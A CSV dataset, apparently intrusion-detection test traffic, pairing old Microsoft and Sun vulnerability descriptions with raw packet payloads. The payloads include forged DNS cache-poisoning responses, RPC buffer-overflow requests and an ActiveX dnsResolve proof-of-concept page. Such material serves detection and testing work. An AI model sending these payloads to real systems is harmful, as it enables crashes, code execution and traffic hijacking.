XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
FSC20041109-01_Microsoft_ISA_Server_DNS_Spoofing_Vulnerability.xml,Microsoft ISA Server DNS Spoofing Vulnerability,A vulnerability exists in the DNS cache functionality of Microsoft Internet Security and Acceleration (ISA) Server and Microsoft Proxy Server. A vulnerable server can be manipulated into caching and using an incorrect IP address for a DNS hostname. This flaw may allow an attacker to present malicious content to users under the guise of a known and trusted web site.,DNS,UDP,||00 01 85 80 00 01 00 01 00 01 00 00 02 ||97||01 ||1||01 ||2||02 ||10||07 ||in-addr||04 ||arpa||00 00 0C 00 01 C0 0C 00 0C 00 01 00 01 ||Q||80 00 0F 03 ||www||05 ||yahoo||03 ||com||00 C0 0F 00 02 00 01 00 01 ||Q||80 00 09 02 ||10||01 ||2||01 ||1||C0 0C||
﻿FSC20070413-01_Microsoft_Windows_DNS_Server_RPC_Management_Interface_Buffer_Overflow.xml,Microsoft Windows DNS Server RPC Management Interface Buffer Overflow,"There exists a stack buffer overflow vulnerability in Microsoft Windows Domain Name System (DNS) Server services. The vulnerability is caused by a boundary error while handling specially crafted Remote Procedure Call (RPC) requests. Successful exploitation of the vulnerability could allow for arbitrary code injection and execution in the security context of the affected RPC Server service, commonly System.",POLESTAR,TCP,||05 00 0B 03 10 00 00 00 ||H||00 00 00 01 00 00 00 D0 16 D0 16 00 00 00 00 01 00 00 00 00 00 01 00 A4 C2 AB ||PMW||B3 ||@||9D ||f||EE ||O||D5 FB A0 ||v||05 00 00 00 04 ||]||88 8A EB 1C C9 11 9F E8 08 00 ||+||10 ||H`||02 00 00 00||
FSC20070413-01_Microsoft_Windows_DNS_Server_RPC_Management_Interface_Buffer_Overflow.xml,Microsoft Windows DNS Server RPC Management Interface Buffer Overflow,"There exists a stack buffer overflow vulnerability in Microsoft Windows Domain Name System (DNS) Server services. The vulnerability is caused by a boundary error while handling specially crafted Remote Procedure Call (RPC) requests. Successful exploitation of the vulnerability could allow for arbitrary code injection and execution in the security context of the affected RPC Server service, commonly System.",POLESTAR,TCP,||05 00 00 03 10 00 00 00 ||5||0A 00 00 01 00 00 00 1D 0A 00 00 00 00 01 00 00 00 00 00 01 00 00 00 01 0A 00 00 00 00 00 00 01 0A 00 00 ||\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.||00 00 00 00 00 00 00 00 00||
FSC20070413-01_Microsoft_Windows_DNS_Server_RPC_Management_Interface_Buffer_Overflow.xml,Microsoft Windows DNS Server RPC Management Interface Buffer Overflow,"There exists a stack buffer overflow vulnerability in Microsoft Windows Domain Name System (DNS) Server services. The vulnerability is caused by a boundary error while handling specially crafted Remote Procedure Call (RPC) requests. Successful exploitation of the vulnerability could allow for arbitrary code injection and execution in the security context of the affected RPC Server service, commonly System.",POLESTAR,TCP,||05 00 0C 03 10 00 00 00 ||<||00 00 00 01 00 00 00 D0 16 D0 16 F9 ||D||88 00 05 00 ||1060||00 00 01 00 00 00 00 00 00 00 04 ||]||88 8A EB 1C C9 11 9F E8 08 00 ||+||10 ||H`||02 00 00 00||
FSC20070413-01_Microsoft_Windows_DNS_Server_RPC_Management_Interface_Buffer_Overflow.xml,Microsoft Windows DNS Server RPC Management Interface Buffer Overflow,"There exists a stack buffer overflow vulnerability in Microsoft Windows Domain Name System (DNS) Server services. The vulnerability is caused by a boundary error while handling specially crafted Remote Procedure Call (RPC) requests. Successful exploitation of the vulnerability could allow for arbitrary code injection and execution in the security context of the affected RPC Server service, commonly System.",POLESTAR,TCP," "
﻿FSC20070919-07_Sun_Microsystems_JRE_isInstalled_dnsResolve_Function_Memory_Exception.xml,Sun Microsystems JRE isInstalled.dnsResolve Function Memory Exception,"There exists a design weakness vulnerability in the way Sun Java Web Start ActiveX control handles user supplied data. Specifically, the vulnerability is due to improper validation of user supplied data in the isInstalled.dnsResolve ActiveX control method. A remote attacker can exploit this vulnerability by enticing the target user to open a malicious webpage, causing a denial-of service condition. ",HTTP,TCP,"GET /~ndezhkam/poc.html HTTP/1.1||0D 0A ||Accept||3A || image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*||0D 0A ||Accept-Language||3A || en-us||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.1||3B || SV1)||0D 0A ||Host||3A || 172.16.1.2||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A||"
FSC20070919-07_Sun_Microsystems_JRE_isInstalled_dnsResolve_Function_Memory_Exception.xml,Sun Microsystems JRE isInstalled.dnsResolve Function Memory Exception,"There exists a design weakness vulnerability in the way Sun Java Web Start ActiveX control handles user supplied data. Specifically, the vulnerability is due to improper validation of user supplied data in the isInstalled.dnsResolve ActiveX control method. A remote attacker can exploit this vulnerability by enticing the target user to open a malicious webpage, causing a denial-of service condition. ",HTTP,TCP,"||00 00 00 00 00 00 ||HTTP/1.1 200 OK||0D 0A ||Date||3A || Thu, 20 Sep 2007 17||3A ||42||3A ||59 GMT||0D 0A ||Server||3A || Apache/2.0.52 (CentOS) PHP/4.3.9 mod_python/3.1.3 Python/2.3.4 mod_perl/2.0.1 Perl/v5.8.5||0D 0A ||Last-Modified||3A || Thu, 20 Sep 2007 17||3A ||24||3A ||37 GMT||0D 0A ||ETag||3A || ||22 ||b0faf-16c-6db51f40||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 364||0D 0A ||Keep-Alive||3A || timeout=15, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<HTML> ||0D 0A ||<BODY>   ||0D 0A ||<br>Proof of Concept template<br> Copyright Assurent Secure Technologies, a Telus Company||0D 0A ||<br> All Rights Reserved <br>||0D 0A 0D 0A ||<object id='ctrl' classid='CLSID||3A ||5852F5ED-8BF4-11D4-A245-0080C6F74284'></object>||0D 0A 0D 0A ||<script language=||22 ||javascript||22 ||>||0D 0A 0D 0A ||d = ||22 ||AAAA||22 0D 0A ||while (d.length <= 262500) d+=d||3B 0D 0A 0D 0A ||ctrl.dnsResolve(d)||3B 0D 0A 0D 0A ||</script>||0D 0A 0D 0A ||</BODY>||0D 0A ||</HTML>||0D 0A||"
﻿FSC20071113-06_Microsoft_Windows_DNS_Server_Spoofing_Vulnerability.xml,Microsoft Windows DNS Server Spoofing Vulnerability,"There exists a DNS Cache Poisoning vulnerability in Microsoft DNS servers. The vulnerability is due to predictable transaction ID values in outgoing DNS queries. A remote attacker can exploit this vulnerability to poison the DNS cache by sending malicious responses to DNS requests, thereby redirecting Internet traffic to illegitimate sites.",DNS,UDP," ||00 85 80 00 01 00 01 00 00 00 00 03 ||www||07 ||example||03 ||com||00 00 01 00 01 C0 0C 00 01 00 01 00 00 0E 10 00 04 ||****"
FSC20071113-06_Microsoft_Windows_DNS_Server_Spoofing_Vulnerability.xml,Microsoft Windows DNS Server Spoofing Vulnerability,"There exists a DNS Cache Poisoning vulnerability in Microsoft DNS servers. The vulnerability is due to predictable transaction ID values in outgoing DNS queries. A remote attacker can exploit this vulnerability to poison the DNS cache by sending malicious responses to DNS requests, thereby redirecting Internet traffic to illegitimate sites.",DNS,UDP,)||00 85 80 00 01 00 01 00 00 00 00 03 ||www||07 ||example||03 ||com||00 00 01 00 01 C0 0C 00 01 00 01 00 00 0E 10 00 04 ||****
FSC20071113-06_Microsoft_Windows_DNS_Server_Spoofing_Vulnerability.xml,Microsoft Windows DNS Server Spoofing Vulnerability,"There exists a DNS Cache Poisoning vulnerability in Microsoft DNS servers. The vulnerability is due to predictable transaction ID values in outgoing DNS queries. A remote attacker can exploit this vulnerability to poison the DNS cache by sending malicious responses to DNS requests, thereby redirecting Internet traffic to illegitimate sites.",DNS,UDP,2||00 85 80 00 01 00 01 00 00 00 00 03 ||www||07 ||example||03 ||com||00 00 01 00 01 C0 0C 00 01 00 01 00 00 0E 10 00 04 ||****
FSC20071113-06_Microsoft_Windows_DNS_Server_Spoofing_Vulnerability.xml,Microsoft Windows DNS Server Spoofing Vulnerability,"There exists a DNS Cache Poisoning vulnerability in Microsoft DNS servers. The vulnerability is due to predictable transaction ID values in outgoing DNS queries. A remote attacker can exploit this vulnerability to poison the DNS cache by sending malicious responses to DNS requests, thereby redirecting Internet traffic to illegitimate sites.",DNS,UDP,||3B 00 85 80 00 01 00 01 00 00 00 00 03 ||www||07 ||example||03 ||com||00 00 01 00 01 C0 0C 00 01 00 01 00 00 0E 10 00 04 ||****
FSC20071113-06_Microsoft_Windows_DNS_Server_Spoofing_Vulnerability.xml,Microsoft Windows DNS Server Spoofing Vulnerability,"There exists a DNS Cache Poisoning vulnerability in Microsoft DNS servers. The vulnerability is due to predictable transaction ID values in outgoing DNS queries. A remote attacker can exploit this vulnerability to poison the DNS cache by sending malicious responses to DNS requests, thereby redirecting Internet traffic to illegitimate sites.",DNS,UDP,||07 00 85 80 00 01 00 01 00 00 00 00 03 ||www||07 ||example||03 ||com||00 00 01 00 01 C0 0C 00 01 00 01 00 00 0E 10 00 04 ||****
FSC20071113-06_Microsoft_Windows_DNS_Server_Spoofing_Vulnerability.xml,Microsoft Windows DNS Server Spoofing Vulnerability,"There exists a DNS Cache Poisoning vulnerability in Microsoft DNS servers. The vulnerability is due to predictable transaction ID values in outgoing DNS queries. A remote attacker can exploit this vulnerability to poison the DNS cache by sending malicious responses to DNS requests, thereby redirecting Internet traffic to illegitimate sites.",DNS,UDP,||0D 00 85 80 00 01 00 01 00 00 00 00 03 ||www||07 ||example||03 ||com||00 00 01 00 01 C0 0C 00 01 00 01 00 00 0E 10 00 04 ||****
FSC20071113-06_Microsoft_Windows_DNS_Server_Spoofing_Vulnerability.xml,Microsoft Windows DNS Server Spoofing Vulnerability,"There exists a DNS Cache Poisoning vulnerability in Microsoft DNS servers. The vulnerability is due to predictable transaction ID values in outgoing DNS queries. A remote attacker can exploit this vulnerability to poison the DNS cache by sending malicious responses to DNS requests, thereby redirecting Internet traffic to illegitimate sites.",DNS,UDP,||16 00 85 80 00 01 00 01 00 00 00 00 03 ||www||07 ||example||03 ||com||00 00 01 00 01 C0 0C 00 01 00 01 00 00 0E 10 00 04 ||****
